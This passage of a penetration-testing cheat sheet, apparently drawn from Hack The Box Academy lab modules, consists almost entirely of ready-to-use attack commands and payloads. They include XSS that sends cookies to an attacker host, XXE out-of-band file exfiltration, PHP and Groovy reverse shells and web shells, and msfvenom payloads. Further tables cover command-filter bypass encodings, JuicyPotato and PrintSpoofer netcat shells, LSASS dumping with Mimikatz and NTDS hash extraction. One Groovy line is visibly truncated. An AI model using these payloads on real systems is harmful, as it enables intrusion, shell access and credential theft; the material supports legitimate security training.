<tr class="even">
<td><code>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</code></td>
<td>Check for DBA privileges</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></td>
<td>Reading a local file</td>
</tr>
<tr class="even">
<td><code>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></td>
<td>Writing a file</td>
</tr>
<tr class="odd">
<td><code>sqlmap -u "http://www.example.com/?id=1" --os-shell</code></td>
<td>Spawning an OS shell</td>
</tr>
</tbody>
</table>
<p><a id="19-cross-site-scripting-xss"></a> ### 19. Cross-Site Scripting
(XSS)</p>
<h4 id="commands">Commands</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>XSS Payloads</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td>
<td>Basic XSS Payload</td>
</tr>
<tr class="odd">
<td><code>&lt;plaintext&gt;</code></td>
<td>Basic XSS Payload</td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;print()&lt;/script&gt;</code></td>
<td>Basic XSS Payload</td>
</tr>
<tr class="odd">
<td><code>&lt;img src="" onerror=alert(window.origin)&gt;</code></td>
<td>HTML-based XSS Payload</td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;</code></td>
<td>Change Background Color</td>
</tr>
<tr class="odd">
<td><code>&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;</code></td>
<td>Change Background Image</td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code></td>
<td>Change Website Title</td>
</tr>
<tr class="odd">
<td><code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code></td>
<td>Overwrite website’s main body</td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code></td>
<td>Remove certain HTML element</td>
</tr>
<tr class="odd">
<td><code>&lt;script src="http://OUR_IP/script.js"&gt;&lt;/script&gt;</code></td>
<td>Load remote script</td>
</tr>
<tr class="even">
<td><code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code></td>
<td>Send Cookie details to us</td>
</tr>
<tr class="odd">
<td><strong>Commands</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</code></td>
<td>Run <code>xsstrike</code> on a url parameter</td>
</tr>
<tr class="odd">
<td><code>sudo nc -lvnp 80</code></td>
<td>Start <code>netcat</code> listener</td>
</tr>
<tr class="even">
<td><code>sudo php -S 0.0.0.0:80</code></td>
<td>Start <code>PHP</code> server</td>
</tr>
</tbody>
</table>
<p><a id="20-file-inclusion"></a> ### 20. File Inclusion</p>
<p><a id="21-file-upload-attacks"></a> ### 21. File Upload Attacks</p>
<p><a id="22-command-injections"></a> ### 22. Command Injections</p>
<p><strong>Injection Operators</strong></p>
<table>
<colgroup>
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Injection Operator</strong></th>
<th><strong>Injection Character</strong></th>
<th><strong>URL-Encoded Character</strong></th>
<th><strong>Executed Command</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Semicolon</td>
<td><code>;</code></td>
<td><code>%3b</code></td>
<td>Both</td>
</tr>
<tr class="even">
<td>New Line</td>
<td><code>\n</code></td>
<td><code>%0a</code></td>
<td>Both</td>
</tr>
<tr class="odd">
<td>Background</td>
<td><code>&amp;</code></td>
<td><code>%26</code></td>
<td>Both (second output generally shown first)</td>
</tr>
<tr class="even">
<td>Pipe</td>
<td><code>\|</code></td>
<td><code>%7c</code></td>
<td>Both (only second output is shown)</td>
</tr>
<tr class="odd">
<td>AND</td>
<td><code>&amp;&amp;</code></td>
<td><code>%26%26</code></td>
<td>Both (only if first succeeds)</td>
</tr>
<tr class="even">
<td>OR</td>
<td><code>\|\|</code></td>
<td><code>%7c%7c</code></td>
<td>Second (only if first fails)</td>
</tr>
<tr class="odd">
<td>Sub-Shell</td>
<td><code>``</code></td>
<td><code>%60%60</code></td>
<td>Both (Linux-only)</td>
</tr>
<tr class="even">
<td>Sub-Shell</td>
<td><code>$()</code></td>
<td><code>%24%28%29</code></td>
<td>Both (Linux-only)</td>
</tr>
</tbody>
</table>
<h4 id="linux">Linux</h4>
<h5 id="filtered-character-bypass">Filtered Character Bypass</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>printenv</code></td>
<td>Can be used to view all environment variables</td>
</tr>
<tr class="even">
<td><strong>Spaces</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>%09</code></td>
<td>Using tabs instead of spaces</td>
</tr>
<tr class="even">
<td><code>${IFS}</code></td>
<td>Will be replaced with a space and a tab. Cannot be used in
sub-shells (i.e. <code>$()</code>)</td>
</tr>
<tr class="odd">
<td><code>{ls,-la}</code></td>
<td>Commas will be replaced with spaces</td>
</tr>
<tr class="even">
<td><strong>Other Characters</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>${PATH:0:1}</code></td>
<td>Will be replaced with <code>/</code></td>
</tr>
<tr class="even">
<td><code>${LS_COLORS:10:1}</code></td>
<td>Will be replaced with <code>;</code></td>
</tr>
<tr class="odd">
<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
<td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td>
</tr>
</tbody>
</table>
<h5 id="blacklisted-command-bypass">Blacklisted Command Bypass</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Character Insertion</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>'</code> or <code>"</code></td>
<td>Total must be even</td>
</tr>
<tr class="odd">
<td><code>$@</code> or <code>\</code></td>
<td>Linux only</td>
</tr>
<tr class="even">
<td><strong>Case Manipulation</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
<td>Execute command regardless of cases</td>
</tr>
<tr class="even">
<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
<td>Another variation of the technique</td>
</tr>
<tr class="odd">
<td><strong>Reversed Commands</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>echo 'whoami' \| rev</code></td>
<td>Reverse a string</td>
</tr>
<tr class="odd">
<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
<td>Execute reversed command</td>
</tr>
<tr class="even">
<td><strong>Encoded Commands</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>echo -n 'cat /etc/passwd \| grep 33' \| base64</code></td>
<td>Encode a string with base64</td>
</tr>
<tr class="even">
<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
<td>Execute b64 encoded string</td>
</tr>
</tbody>
</table>
<h4 id="windows">Windows</h4>
<h5 id="filtered-character-bypass-1">Filtered Character Bypass</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Get-ChildItem Env:</code></td>
<td>Can be used to view all environment variables - (PowerShell)</td>
</tr>
<tr class="even">
<td><strong>Spaces</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>%09</code></td>
<td>Using tabs instead of spaces</td>
</tr>
<tr class="even">
<td><code>%PROGRAMFILES:~10,-5%</code></td>
<td>Will be replaced with a space - (CMD)</td>
</tr>
<tr class="odd">
<td><code>$env:PROGRAMFILES[10]</code></td>
<td>Will be replaced with a space - (PowerShell)</td>
</tr>
<tr class="even">
<td><strong>Other Characters</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>%HOMEPATH:~0,-17%</code></td>
<td>Will be replaced with <code>\</code> - (CMD)</td>
</tr>
<tr class="even">
<td><code>$env:HOMEPATH[0]</code></td>
<td>Will be replaced with <code>\</code> - (PowerShell)</td>
</tr>
</tbody>
</table>
<h5 id="blacklisted-command-bypass-1">Blacklisted Command Bypass</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Character Insertion</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>'</code> or <code>"</code></td>
<td>Total must be even</td>
</tr>
<tr class="odd">
<td><code>^</code></td>
<td>Windows only (CMD)</td>
</tr>
<tr class="even">
<td><strong>Case Manipulation</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>WhoAmi</code></td>
<td>Simply send the character with odd cases</td>
</tr>
<tr class="even">
<td><strong>Reversed Commands</strong></td>
<td></td>
</tr>
<tr class="odd">
<td><code>"whoami"[-1..-20] -join ''</code></td>
<td>Reverse a string</td>
</tr>
<tr class="even">
<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
<td>Execute reversed command</td>
</tr>
<tr class="odd">
<td><strong>Encoded Commands</strong></td>
<td></td>
</tr>
<tr class="even">
<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
<td>Encode a string with base64</td>
</tr>
<tr class="odd">
<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
<td>Execute b64 encoded string</td>
</tr>
</tbody>
</table>
<p><a id="23-web-attacks"></a> ### 23. Web Attacks</p>
<h4 id="http-verb-tampering">HTTP Verb Tampering</h4>
<p><code>HTTP Method</code> - <code>HEAD</code> - <code>PUT</code> -
<code>DELETE</code> - <code>OPTIONS</code> - <code>PATCH</code></p>
<table>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-X OPTIONS</code></td>
<td>Set HTTP Method with Curl</td>
</tr>
</tbody>
</table>
<h4 id="idor">IDOR</h4>
<p><code>Identify IDORS</code> - In
<code>URL parameters &amp; APIs</code> - In <code>AJAX Calls</code> - By
<code>understanding reference hashing/encoding</code> - By
<code>comparing user roles</code></p>
<table>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>md5sum</code></td>
<td>MD5 hash a string</td>
</tr>
<tr class="even">
<td><code>base64</code></td>
<td>Base64 encode a string</td>
</tr>
</tbody>
</table>
<h4 id="xxe">XXE</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Code</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>&lt;!ENTITY xxe SYSTEM "http://localhost/email.dtd"&gt;</code></td>
<td>Define External Entity to a URL</td>
</tr>
<tr class="even">
<td><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
<td>Define External Entity to a file path</td>
</tr>
<tr class="odd">
<td><code>&lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</code></td>
<td>Read PHP source code with base64 encode filter</td>
</tr>
<tr class="even">
<td><code>&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</code></td>
<td>Reading a file through a PHP error</td>
</tr>
<tr class="odd">
<td><code>&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;"&gt;</code></td>
<td>Reading a file OOB exfiltration</td>
</tr>
</tbody>
</table>
<p><a id="24-attacking-common-applications"></a> ### 24. Attacking
Common Applications</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>sudo vim /etc/hosts</code></td>
<td>Opens the <code>/etc/hosts</code> with <code>vim</code> to start
adding hostnames</td>
</tr>
<tr class="even">
<td><code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code></td>
<td>Runs an nmap scan using common web application ports based on a
scope list (<code>scope_list</code>) and outputs to a file
(<code>web_discovery</code>) in all formats (<code>-oA</code>)</td>
</tr>
<tr class="odd">
<td><code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code></td>
<td>Runs <code>eyewitness</code> using a file generated by an nmap scan
(<code>web_discovery.xml</code>) and creates a directory
(<code>-d</code>)</td>
</tr>
<tr class="even">
<td><code>cat web_discovery.xml \| ./aquatone -nmap</code></td>
<td>Concatenates the contents of nmap scan output (web_discovery.xml)
and pipes it (<code>|</code>) aquatone (<code>./aquatone</code>)and
ensures aquatone recognizes the file as nmap scan output
(<code>-nmap</code>)</td>
</tr>
<tr class="odd">
<td><code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code></td>
<td>Runs wpscan using the <code>--enmuerate</code> flag. Can replace the
url with any valid and reachable URL in each challenge</td>
</tr>
<tr class="even">
<td><code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code></td>
<td>Runs wpscan and uses it to perform a password attack
(<code>--password-attack</code>) against the specified url and
references a word list
(<code>/usr/share/wordlists/rockyou.txt</code>)</td>
</tr>
<tr class="odd">
<td><code>curl -s http://&lt;hostnameoripoftargetsite/path/to/webshell.php?cmd=id</code></td>
<td>cURL command used to execute commands (<code>cmd=id</code>) on a
vulnerable system utilizing a php-based webshell</td>
</tr>
<tr class="even">
<td><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1'");</code></td>
<td>PHP code that will execute a reverse shell on a Linux-based
system</td>
</tr>
<tr class="odd">
<td><code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code></td>
<td>Runs <code>droopescan</code> against a joomla site located at the
specified url</td>
</tr>
<tr class="even">
<td><code>sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code></td>
<td>Runs joomla-brute.py tool with python3 against a specified url,
utilizing a specified wordlist
(<code>/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt</code>)
and user or list of usernames (<code>-usr</code>)</td>
</tr>
<tr class="odd">
<td><code>&lt;?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?&gt;</code></td>
<td>PHP code that will allow for web shell access on a vulnerable drupal
site. Can be used through browisng to the location of the file in the
web directory after saving. Can also be leveraged utilizing curl. See
next command.</td>
</tr>
<tr class="even">
<td><code>curl -s &lt;http://domainname or IP address of site&gt; /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d"&gt;"</code></td>
<td>Uses curl to navigate to php web shell file and run system commands
(<code>=id</code>) on the target</td>
</tr>
<tr class="odd">
<td><code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></td>
<td><code>gobuster</code> powered directory brute forcing attack
refrencing a wordlist
(<code>/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code>)</td>
</tr>
<tr class="even">
<td><code>auxiliary/scanner/http/tomcat_mgr_login</code></td>
<td>Useful Metasploit scanner module used to perform a bruteforce login
attack against a tomcat site</td>
</tr>
<tr class="odd">
<td><code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></td>
<td>Runs mgr_brute.py using python3 against the specified website starts
in the /manager directory (<code>-P /manager</code>) and references a
specified user or userlist ( <code>-u</code>) as well as a specified
password or password list (<code>-p</code>)</td>
</tr>
<tr class="even">
<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code></td>
<td>Generates a jsp-based reverse shell payload in the form of a .war
file utilizing <code>msfvenom</code></td>
</tr>
<tr class="odd">
<td><code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code></td>
<td>Nmap scan useful in enumerating Apache Tomcat and AJP services</td>
</tr>
<tr class="even">
<td><code>r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \| while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor()</code></td>
<td>Groovy-based reverse shell payload/code that can work with admin
access to the <code>Script Console</code> of a <code>Jenkins</code>
site. Will work when the underlying OS is Linux</td>
</tr>
<tr class="odd">
<td><code>def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");</code></td>
<td>Groovy-based payload/code that can work with admin access to the
<code>Script Console</code> of a <code>Jenkins</code> site. This will
allow webshell access and to execute commands on the underlying Windows
system</td>
</tr>
<tr class="even">
<td><code>String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code></td>
<td>Groovy-based reverse shell payload/code that can work with admin
acess to the <code>Script Console</code> of a <code>Jenkins</code>site.
Will work when the underlying OS is Windows</td>
</tr>
<tr class="odd">
<td><a
href="https://github.com/0xjpuff/reverse_shell_splunk">reverse_shell_splunk</a></td>
<td>A simple Splunk package for obtaining revershells on Windows and
Linux systems</td>
</tr>
</tbody>
</table>
<p><a id="post-exploitation"></a> ## Post-Exploitation</p>
<p><a id="25-linux-privilege-escalation"></a> ### 25. Linux Privilege
Escalation</p>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ssh htb-student@&lt;target IP&gt;</code></td>
<td>SSH to lab target</td>
</tr>
<tr class="even">
<td><code>ps aux \| grep root</code></td>
<td>See processes running as root</td>
</tr>
<tr class="odd">
<td><code>ps au</code></td>
<td>See logged in users</td>
</tr>
<tr class="even">
<td><code>ls /home</code></td>
<td>View user home directories</td>
</tr>
<tr class="odd">
<td><code>ls -l ~/.ssh</code></td>
<td>Check for SSH keys for current user</td>
</tr>
<tr class="even">
<td><code>history</code></td>
<td>Check the current user’s Bash history</td>
</tr>
<tr class="odd">
<td><code>sudo -l</code></td>
<td>Can the user run anything as another user?</td>
</tr>
<tr class="even">
<td><code>ls -la /etc/cron.daily</code></td>
<td>Check for daily Cron jobs</td>
</tr>
<tr class="odd">
<td><code>lsblk</code></td>
<td>Check for unmounted file systems/drives</td>
</tr>
<tr class="even">
<td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td>
<td>Find world-writeable directories</td>
</tr>
<tr class="odd">
<td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td>
<td>Find world-writeable files</td>
</tr>
<tr class="even">
<td><code>uname -a</code></td>
<td>Check the Kernel versiion</td>
</tr>
<tr class="odd">
<td><code>cat /etc/lsb-release</code></td>
<td>Check the OS version</td>
</tr>
<tr class="even">
<td><code>gcc kernel_expoit.c -o kernel_expoit</code></td>
<td>Compile an exploit written in C</td>
</tr>
<tr class="odd">
<td><code>screen -v</code></td>
<td>Check the installed version of <code>Screen</code></td>
</tr>
<tr class="even">
<td><code>./pspy64 -pf -i 1000</code></td>
<td>View running processes with <code>pspy</code></td>
</tr>
<tr class="odd">
<td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
<td>Find binaries with the SUID bit set</td>
</tr>
<tr class="even">
<td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
<td>Find binaries with the SETGID bit set</td>
</tr>
<tr class="odd">
<td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td>
<td>Priv esc with <code>tcpdump</code></td>
</tr>
<tr class="even">
<td><code>echo $PATH</code></td>
<td>Check the current user’s PATH variable contents</td>
</tr>
<tr class="odd">
<td><code>PATH=.:${PATH}</code></td>
<td>Add a <code>.</code> to the beginning of the current user’s
PATH</td>
</tr>
<tr class="even">
<td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2&gt;/dev/null</code></td>
<td>Search for config files</td>
</tr>
<tr class="odd">
<td><code>ldd /bin/ls</code></td>
<td>View the shared objects required by a binary</td>
</tr>
<tr class="even">
<td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td>
<td>Escalate privileges using <code>LD_PRELOAD</code></td>
</tr>
<tr class="odd">
<td><code>readelf -d payroll  \| grep PATH</code></td>
<td>Check the RUNPATH of a binary</td>
</tr>
<tr class="even">
<td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td>
<td>Compiled a shared libary</td>
</tr>
<tr class="odd">
<td><code>lxd init</code></td>
<td>Start the LXD initialization process</td>
</tr>
<tr class="even">
<td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td>
<td>Import a local image</td>
</tr>
<tr class="odd">
<td><code>lxc init alpine r00t -c security.privileged=true</code></td>
<td>Start a privileged LXD container</td>
</tr>
<tr class="even">
<td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td>
<td>Mount the host file system in a container</td>
</tr>
<tr class="odd">
<td><code>lxc start r00t</code></td>
<td>Start the container</td>
</tr>
<tr class="even">
<td><code>showmount -e 10.129.2.12</code></td>
<td>Show the NFS export list</td>
</tr>
<tr class="odd">
<td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
<td>Mount an NFS share locally</td>
</tr>
<tr class="even">
<td><code>tmux -S /shareds new -s debugsess</code></td>
<td>Created a shared <code>tmux</code> session socket</td>
</tr>
<tr class="odd">
<td><code>./lynis audit system</code></td>
<td>Perform a system audit with <code>Lynis</code></td>
</tr>
</tbody>
</table>
<p><a id="26-windows-privilege-escalation"></a> ### 26. Windows
Privilege Escalation</p>
<h4 id="initial-enumeration-1">Initial Enumeration</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code></td>
<td>RDP to lab target</td>
</tr>
<tr class="even">
<td><code>ipconfig /all</code></td>
<td>Get interface, IP address and DNS information</td>
</tr>
<tr class="odd">
<td><code>arp -a</code></td>
<td>Review ARP table</td>
</tr>
<tr class="even">
<td><code>route print</code></td>
<td>Review routing table</td>
</tr>
<tr class="odd">
<td><code>Get-MpComputerStatus</code></td>
<td>Check Windows Defender status</td>
</tr>
<tr class="even">
<td><code>Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections</code></td>
<td>List AppLocker rules</td>
</tr>
<tr class="odd">
<td><code>Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone</code></td>
<td>Test AppLocker policy</td>
</tr>
<tr class="even">
<td><code>set</code></td>
<td>Display all environment variables</td>
</tr>
<tr class="odd">
<td><code>systeminfo</code></td>
<td>View detailed system configuration information</td>
</tr>
<tr class="even">
<td><code>wmic qfe</code></td>
<td>Get patches and updates</td>
</tr>
<tr class="odd">
<td><code>wmic product get name</code></td>
<td>Get installed programs</td>
</tr>
<tr class="even">
<td><code>tasklist /svc</code></td>
<td>Display running processes</td>
</tr>
<tr class="odd">
<td><code>query user</code></td>
<td>Get logged-in users</td>
</tr>
<tr class="even">
<td><code>echo %USERNAME%</code></td>
<td>Get current user</td>
</tr>
<tr class="odd">
<td><code>whoami /priv</code></td>
<td>View current user privileges</td>
</tr>
<tr class="even">
<td><code>whoami /groups</code></td>
<td>View current user group information</td>
</tr>
<tr class="odd">
<td><code>net user</code></td>
<td>Get all system users</td>
</tr>
<tr class="even">
<td><code>net localgroup</code></td>
<td>Get all system groups</td>
</tr>
<tr class="odd">
<td><code>net localgroup administrators</code></td>
<td>View details about a group</td>
</tr>
<tr class="even">
<td><code>net accounts</code></td>
<td>Get passsword policy</td>
</tr>
<tr class="odd">
<td><code>netstat -ano</code></td>
<td>Display active network connections</td>
</tr>
<tr class="even">
<td><code>pipelist.exe /accepteula</code></td>
<td>List named pipes</td>
</tr>
<tr class="odd">
<td><code>gci \\.\pipe\</code></td>
<td>List named pipes with PowerShell</td>
</tr>
<tr class="even">
<td><code>accesschk.exe /accepteula \\.\Pipe\lsass -v</code></td>
<td>Review permissions on a named pipe</td>
</tr>
</tbody>
</table>
<h4 id="handy-commands">Handy Commands</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth</code></td>
<td>Connect using mssqlclient.py</td>
</tr>
<tr class="even">
<td><code>enable_xp_cmdshell</code></td>
<td>Enable xp_cmdshell with mssqlclient.py</td>
</tr>
<tr class="odd">
<td><code>xp_cmdshell whoami</code></td>
<td>Run OS commands with xp_cmdshell</td>
</tr>
<tr class="even">
<td><code>c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *</code></td>
<td>Escalate privileges with JuicyPotato</td>
</tr>
<tr class="odd">
<td><code>c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"</code></td>
<td>Escalating privileges with PrintSpoofer</td>
</tr>
<tr class="even">
<td><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></td>
<td>Take memory dump with ProcDump</td>
</tr>
<tr class="odd">
<td><code>sekurlsa::minidump lsass.dmp</code> and
<code>sekurlsa::logonpasswords</code></td>
<td>Use MimiKatz to extract credentials from LSASS memory dump</td>
</tr>
<tr class="even">
<td><code>dir /q C:\backups\wwwroot\web.config</code></td>
<td>Checking ownership of a file</td>
</tr>
<tr class="odd">
<td><code>takeown /f C:\backups\wwwroot\web.config</code></td>
<td>Taking ownership of a file</td>
</tr>
<tr class="even">
<td><code>Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}</code></td>
<td>Confirming changed ownership of a file</td>
</tr>
<tr class="odd">
<td><code>icacls “C:\backups\wwwroot\web.config” /grant htb-student:F</code></td>
<td>Modifying a file ACL</td>
</tr>
<tr class="even">
<td><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></td>
<td>Extract hashes with secretsdump.py</td>
</tr>
<tr class="odd">
<td><code>robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></td>
<td>Copy files with ROBOCOPY</td>
</tr>
<tr class="even">
<td><code>wevtutil qe Security /rd:true /f:text \| Select-String "/user"</code></td>
<td>Searching security event logs</td>
</tr>
<tr class="odd">
<td><code>wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"</code></td>
<td>Passing credentials to wevtutil</td>
</tr>
<tr class="even">
<td><code>Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code></td>
<td>Searching event logs with PowerShell</td>
</tr>
<tr class="odd">
<td><code>msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll</code></td>
<td>Generate malicious DLL</td>
</tr>
<tr class="even">
<td><code>dnscmd.exe /config /serverlevelplugindll adduser.dll</code></td>
<td>Loading a custom DLL with dnscmd</td>
</tr>
<tr class="odd">
<td><code>wmic useraccount where name="netadm" get sid</code></td>
<td>Finding a user’s SID</td>
</tr>
<tr class="even">
<td><code>sc.exe sdshow DNS</code></td>
<td>Checking permissions on DNS service</td>
</tr>
<tr class="odd">
<td><code>sc stop dns</code></td>
<td>Stopping a service</td>
</tr>
<tr class="even">
<td><code>sc start dns</code></td>
<td>Starting a service</td>
</tr>
<tr class="odd">
<td><code>reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</code></td>
<td>Querying a registry key</td>
</tr>
<tr class="even">
<td><code>reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll</code></td>
<td>Deleting a registry key</td>
</tr>
<tr class="odd">
<td><code>sc query dns</code></td>
